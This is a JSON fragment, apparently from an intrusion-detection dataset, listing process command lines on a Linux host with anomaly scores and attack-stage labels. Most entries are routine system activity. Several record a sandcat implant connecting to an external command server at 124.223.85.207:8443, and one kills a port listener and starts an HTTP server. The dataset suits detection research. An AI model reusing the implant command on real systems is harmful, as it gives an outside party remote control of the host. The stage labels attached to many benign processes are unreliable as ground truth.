+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648479398&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "cb8acc32c6611f20d689283f3a60c941"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648481798&mode=100' procname.shell  \n37.36434555053711",
+        "score": "37.36434555053711",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "bd2519e12fc40bef23406a1129d1f0db"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648480598&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "8e1022ba237e0d9ccc66f24ec728926d"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648484199&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "4a17220769ef1989270fba2e9d820d11"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648482998&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "c1d9df91aa2acf9121c9732db77777fc"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648193757&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "78a02e89c9e618ad6da81a3ef0e0356c"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648486599&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "e2236c3f68adf4d12a3e4bf507e8c63c"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648485399&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "1c6988ee626c4b2f01d1e9e26c5226aa"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648488999&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "c67ab50f5b2ac685bfb00c1436849f70"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648487799&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "d43fc0455ed51c835810ba3775785257"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648491400&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "cfa16f7e6645dcfb3abc65d7ee62aa59"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648194958&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "6badaf3bb3f6b204b729f7c4b1b8ec9f"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648492600&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "15b1a57decf993b172f1b952fce3a71e"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648490199&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "e6668f25d41cd45fbca28489abca3619"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648472197&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "975675fd65ebe3ea130586f528578a7c"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648473397&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "46ba70265fa8a678a1b047b91e758edf"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648474597&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "2766e48b71536685d0a28b5dc380e713"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648475797&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "1f81a5222b26d93cca4b40ff398625ee"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648192557&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "4f90079898f4f3a0d19396519041593e"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648476998&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "964664f7069ceb60b17c991137b9f6c2"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648478198&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "8cfd43ca22a41773ee96aad97bd85616"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648479398&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "7eace538e80855acf38b980729a1fa9b"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648481798&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "e46b5e071ea1daecc590da1fd79b3206"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648480598&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "042eae467058f9382d42219868ac4f01"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648484199&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "3229a9662ba5984d6b1a93e9910e23a1"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648482998&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "ef0960b057124e17db1b1e5458a631e0"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648193757&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "d8a400fe540ec101efff410bfceb7abf"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648486599&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "642c704b781c7725027940a844abc4a8"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648485399&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "a6f63bc2ba96f02026260b39ae1fef08"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648488999&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "f68745d8d99ee0a186e9ee79ae962c94"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648487799&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "d2344ce7e0f8afced440c85a2116b5cb"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648491400&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "7096ebae7942cd5d3eb9d3e97543c714"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648194958&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "0842abeff32d2da3a8409a94239c1184"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648492600&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "8926ca20809916a46aa09366ddaeb027"
+    },
+    {
+        "label": "curl transfer -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e& \nts=1648490199&mode=100 procname.curl transfer 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "6024f95dfb7af8082ae6d273d08790ac"
+    },
+    {
+        "label": "systemd-udevd procname.systemd-udevd 78.31890869140625",
+        "score": "78.31890869140625",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "34932234b0e44b41bbb5d9a8adcf1620"
+    },
+    {
+        "label": "sandcat-linux -server https://124.223.85.207:8443 -opid b2f0496b-22bd-4e72-a4ec-b98e644d9bc3  \n-v procname.sandcat-linux 244.65574645996094",
+        "score": "244.65574645996094",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "98.0",
+        "id": "e0b19819ffbadb37ba779ebe29085e8b"
+    },
+    {
+        "label": "ps -ax -o pid=,ppid=,pcpu=,pmem=,command= procname.ps 29.764076232910156",
+        "score": "29.764076232910156",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "168.0",
+        "id": "758eff8591feb78fc4e4300f9637536e"
+    },
+    {
+        "label": "systemd-journal procname.systemd-journal 26.871845245361328",
+        "score": "26.871845245361328",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "96.0",
+        "id": "ec68e040f7321b3a90f707cb1f8033af"
+    },
+    {
+        "label": "uniagent procname.uniagent 119.50218200683594",
+        "score": "119.50218200683594",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "436.0",
+        "id": "75476b5ba93400463262d7c57cdc973f"
+    },
+    {
+        "label": "sandcat-linux -server https://124.223.85.207:8443 -opid e83858ad-7cbb-4d53-97f1-dad030de4cf9  \n-v procname.sandcat-linux 149.1361541748047",
+        "score": "149.1361541748047",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "120.0",
+        "id": "b8fa95f2d2d39924b045b41cf5991d3f"
+    },
+    {
+        "label": "shell -c echo end:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46 procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "de6e0a2c0c7ec7388f8335b30f89755e"
+    },
+    {
+        "label": "shell -c echo start:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46 procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "2da032ee3f528aa2d62868f677efa1b9"
+    },
+    {
+        "label": "shell -c kill -9 $(lsof -i:8080 -t) ; nohup timeout 600 python -m SimpleHTTPServer  \n8079 > /dev/null 2>&1 & procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "36.0",
+        "id": "dc8e2b5c2912d4a5049ad2cb3ad90387"
+    },
+    {
+        "label": "lsof -i:8080 -t procname.lsof 43.52830505371094",
+        "score": "43.52830505371094",
+        "shape": "box",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "24.0",
+        "id": "bc97cc66c3f4038cd0e9582f6a66ec69"
+    },
+    {
+        "label": "node /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/server/main.js  \n--start-server --host=127.0.0.1 --enable-remote-auto-shutdown --port=0 --connection-secret /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.token  \nprocname.node 100.84552001953125",
+        "score": "100.84552001953125",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "336.0",
+        "id": "2a4396026a605b88502656bc8e03c225"
+    },
+    {
+        "label": "node /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/bootstrap-fork --type=watcherServiceChokidar  \nprocname.node 57.597171783447266",
+        "score": "57.597171783447266",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "96e8fa865ee11acc7e0fa23f0aad8bd5"
+    },
+    {
+        "label": "bashell -ilc '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node'   \n-p ''1ae0255d3f68' + JSON.stringify(process.env) + '1ae0255d3f68'' procname.bashell 47.5633544921875",
+        "score": "47.5633544921875",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "226.0",
+        "id": "6a0a129f076b6cbd9294f3ab0b870993"
+    },
+    {
+        "label": "bashell -ilc '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node'   \n-p ''ca8f367fc32a' + JSON.stringify(process.env) + 'ca8f367fc32a'' procname.bashell 55.79502487182617",
+        "score": "55.79502487182617",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "226.0",
+        "id": "240ba85c5cbd4bbc4caa0e9a26226354"
+    },
+    {
+        "label": "systemd nospectre_v2 nopti noibrs noibpb procname.systemd 75.8393325805664",
+        "score": "75.8393325805664",
+        "shape": "box",
+        "stage": "Escalate Privilege",
+        "stage_score": "222.0",
+        "id": "e6d5be4e9d595dddf6dcbe1fff37813e"
+    },
+    {
+        "label": "sandcat-linux -server https://124.223.85.207:8443 -opid 7b29ba5a-2924-427b-a352-5b4f28663601  \n-v procname.sandcat-linux 149.36972045898438",
+        "score": "149.36972045898438",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "122.0",
+        "id": "a897833c84ca38eb9d6c06553db9211f"
+    },
+    {
+        "label": "cron -f procname.cron 34.95181655883789",
+        "score": "34.95181655883789",
+        "shape": "box",
+        "stage": "Escalate Privilege",
+        "stage_score": "22.0",
+        "id": "1807541b2319478c099d9337250f3501"
+    },
+    {
+        "label": "mandb --quiet procname.mandb 32.80121994018555",
+        "score": "32.80121994018555",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "5f5ba47bb2544b5429cf0b69f07423fc"
+    },
+    {
+        "label": "find /var/cache/man -type f -name ..gz -atime +6 -delete procname.find 43.95478057861328",
+        "score": "43.95478057861328",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "4b7551e3482f33487583dbf04201376f"
+    },
+    {
+        "label": "fwupd procname.fwupd 60.57334518432617",
+        "score": "60.57334518432617",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "39eeb2e93fb87129c2e5f7dce36c9a66"
+    },
+    {
+        "label": "apt.systemd.dai /usr/lib/apt/apt.systemd.daily update procname.apt.systemd.dai 36.70184326171875",
+        "score": "36.70184326171875",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "d7493d3cfe3a8b40f66529ed9c80e792"
+    },
+    {
+        "label": "shell -c    cd / && run-parts --report /etc/cron.hourly procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "6838271034bcd786835e313887f72dc1"
+    },
+    {
+        "label": "shell -c    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest  \n--crond procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "24.0",
+        "id": "5ee6dc0ff3d1155ceaa3b669a29600aa"
+    },
+    {
+        "label": "popularity-cont /etc/cron.daily/popularity-contest --crond procname.popularity-cont 21.02864646911621",
+        "score": "21.02864646911621",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "39b61fe87397caedcabdb0b07bfebf60"
+    },
+    {
+        "label": "cat read /var/lib/update-notifier/updates-available procname.cat read 28.853130340576172",
+        "score": "28.853130340576172",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "7181b613501268772b1089c355671b36"
+    },
+    {
+        "label": "who -q procname.who 68.56253814697266",
+        "score": "68.56253814697266",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "7346b382a9d42ea254f946691b223bd5"
+    },
+    {
+        "label": "run-parts --lsbsysinit /etc/update-motd.d procname.run-parts 20.367267608642578",
+        "score": "20.367267608642578",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "330.0",
+        "id": "b503e86f3b4ab36bda44dc3899b8bb4e"
+    },
+    {
+        "label": "85-fwupd /etc/update-motd.d/85-fwupd procname.85-fwupd 25.08551597595215",
+        "score": "25.08551597595215",
+        "shape": "box",
+        "stage": "Escalate Privilege",
+        "stage_score": "18.0",
+        "id": "71767549db97bf28db13e514e1b32caa"
+    },
+    {
+        "label": "release-upgrade -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd procname.release-upgrade  \n36.95161056518555",
+        "score": "36.95161056518555",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "26.0",
+        "id": "5663e0a3ca0bd53b29cd2ad9420a2f97"
+    },
+    {
+        "label": "update-motd-fsc /usr/lib/update-notifier/update-motd-fsck-at-reboot procname.update-motd-fsc  \n38.844154357910156",
+        "score": "38.844154357910156",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "192.0",
+        "id": "3f04853e3cb1c64394bffe52ceaa23ac"
+    },
+    {
+        "label": "update-motd-una /usr/share/unattended-upgrades/update-motd-unattended-upgrades procname.update-motd-una 24.009288787841797",
+        "score": "24.009288787841797",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "251b9de9c9aea83e3137fed733090365"
+    },
+    {
+        "label": "50-landscape-sy /etc/update-motd.d/50-landscape-sysinfo procname.50-landscape-sy 21.05284881591797",
+        "score": "21.05284881591797",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "20.0",
+        "id": "e5700fb405503aa6fcc5614647dc5045"
+    },
+    {
+        "label": "90-updates-avai /etc/update-motd.d/90-updates-available procname.90-updates-avai 20.274078369140625",
+        "score": "20.274078369140625",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "12.0",
+        "id": "e192b3faa127349456e9c01bc9cce6dd"
+    },
+    {
+        "label": "update-motd-hwe -e /usr/lib/update-notifier/update-motd-hwe-eol procname.update-motd-hwe  \n23.01243782043457",
+        "score": "23.01243782043457",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "26.0",
+        "id": "4816ee3fd4207af4e2abab7b01adaaa4"
+    },
+    {
+        "label": "update-motd-reb -e /usr/lib/update-notifier/update-motd-reboot-required procname.update-motd-reb 20.410099029541016",
+        "score": "20.410099029541016",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "f324f37c79b53d32d38cea7728d14e98"
+    },
+    {
+        "label": "cat read /run/motd.d/fwupd/85-fwupd procname.cat read 156.01426696777344",
+        "score": "156.01426696777344",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "9367f59096f1905432062e23c06b9464"
+    },
+    {
+        "label": "stat -c %Y /var/lib/ubuntu-release-upgrader/release-upgrade-available procname.stat 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "019a88864d8f0aee5b32866cde37668f"
+    },
+    {
+        "label": "expr 1648192153 + 86400 procname.expr 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "ee90ced7622ae1e3101f938e448eec70"
+    },
+    {
+        "label": "dumpe2fs -h /dev/vda1 procname.dumpe2fs 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "a30f0d4b1af939dadde7403783ce604d"
+    },
+    {
+        "label": "awk $5 ~ /^ext(2|3|4)$/ { print $1 } procname.awk 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "0295d78fe6787d217bf36ba9fe7f1bbe"
+    },
+    {
+        "label": "awk {print $1} /proc/uptime procname.awk 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "0806adbc57329d1c61819bf8d721053e"
+    },
+    {
+        "label": "stat -c %Y /var/lib/update-notifier/fsck-at-reboot procname.stat 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "51ef60cd75982c8f58cceeb921355857"
+    },
+    {
+        "label": "cat read /var/lib/update-notifier/fsck-at-reboot procname.cat read 32.23503112792969",
+        "score": "32.23503112792969",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "c0e4bc795478a646099db4131a22768a"
+    },
+    {
+        "label": "dumpe2fs -h /dev/vdb procname.dumpe2fs 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "cac5e08ef129b02ad013785c0452d5f0"
+    },
+    {
+        "label": "landscape-sysin /usr/bin/landscape-sysinfo procname.landscape-sysin 34.93817138671875",
+        "score": "34.93817138671875",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "36.0",
+        "id": "a707db292de1d6090f19b61a7c76e9a6"
+    },
+    {
+        "label": "date procname.date 21.714488983154297",
+        "score": "21.714488983154297",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "5fc732311905cb27e82d67f4f6511f7f"
+    },
+    {
+        "label": "cat read /var/lib/update-notifier/hwe-eol procname.cat read 26.774818420410156",
+        "score": "26.774818420410156",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "9b2d33c57af22e07304ba36ade22ce8e"
+    },
+    {
+        "label": "find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/ \nhwe-eol -print -quit procname.find 45.39312744140625",
+        "score": "45.39312744140625",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "97db754defe078d12cd35d28de61c04a"
+    },
+    {
+        "label": "mktemp -p /var/lib/update-notifier procname.mktemp 24.806745529174805",
+        "score": "24.806745529174805",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "08e3ccfc8f54b1e0a3f3cd00b02dbd2a"
+    },
+    {
+        "label": "dpkg --print-foreign-architectures procname.dpkg 24.246753692626953",
+        "score": "24.246753692626953",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "e5b1249b72a20972611c627461637a57"
+    },
+    {
+        "label": "systemd-logind procname.systemd-logind 70.58365631103516",
+        "score": "70.58365631103516",
+        "shape": "box",
+        "stage": "Escalate Privilege",
+        "stage_score": "32.0",
+        "id": "c6b9f285659eb65a2e73b7e2bbded6cd"
+    },
+    {
+        "label": "http procname.http 28.366981506347656",
+        "score": "28.366981506347656",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "80791b3ae7002cb88c246876d9faa8f8"
+    },
+    {
+        "label": "shell -c /usr/bin/test -e /usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service && /usr/bin/ \ntest -S /var/run/dbus/system_bus_socket && /usr/bin/gdbus call --system --dest org.freedesktop.PackageKit --object-path /org/ \nfreedesktop/PackageKit --timeout 4 --method org.freedesktop.PackageKit.StateHasChanged cache-update > /dev/null; /bin/echo > / \ndev/null procname.shell 51.120880126953125",
+        "score": "51.120880126953125",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "2a95a4890fe42fa35cfec156a26ed0ba"
+    },
+    {
+        "label": "apt-check /usr/lib/update-notifier/apt-check --human-readable procname.apt-check 44.88109588623047",
+        "score": "44.88109588623047",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "34.0",
+        "id": "d504fb199d6634cd3cfc076f6c8bb352"
+    },
+    {
+        "label": "lsb_release -Es /usr/bin/lsb_release -c -s procname.lsb_release 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "29242393036c6eb55c52e1c7e26895b3"
+    },
+    {
+        "label": "apt-get -qq -y update procname.apt-get 24.120899200439453",
+        "score": "24.120899200439453",
+        "shape": "box",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "72.0",
+        "id": "67e3e8fbbeef797f954fb4fdf2dbaa36"
+    },
+    {
+        "label": "shell -c if /usr/bin/test -w /var/lib/command-not-found/ -a -e /usr/lib/cnf-update-db; then /usr/lib/cnf-update-db > / \ndev/null; fi procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "ddc4efa724bf9d50dd2fe10b48fa88ca"
+    },
+    {
+        "label": "shell -c /usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "8.0",
+        "id": "6b633cc7e2a73e87a1d604d0095ece72"
+    },
+    {
+        "label": "update-motd-upd -e /usr/lib/update-notifier/update-motd-updates-available procname.update-motd-upd  \n29.505943298339844",
+        "score": "29.505943298339844",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "30.0",
